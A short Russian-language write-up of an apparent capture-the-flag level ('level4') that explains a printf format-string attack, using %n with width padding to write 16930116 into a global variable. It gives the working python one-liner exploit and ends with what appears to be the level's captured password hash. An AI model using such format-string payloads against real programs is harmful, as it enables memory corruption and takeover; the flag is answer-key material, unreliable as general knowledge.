Очень похоже на предыдущее упражнение, но добавляется сложность. Необходимо присвоить глобальной переменной m значение: 16930116. Опция: "%n" присваивает количество ранее записанных символов, поэтому трудно записать так много в 512 буфер.

Однако printf позволяет пользователю добавлять точное количество пробелов с помощью padding. Таким образом, в небольшой буфер можно вставить несколько миллиардов символов.

python -c "print '\x10\x98\x04\x08' + '%16930112x%12\$n'" | ./level4

[blalbalblabla]

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
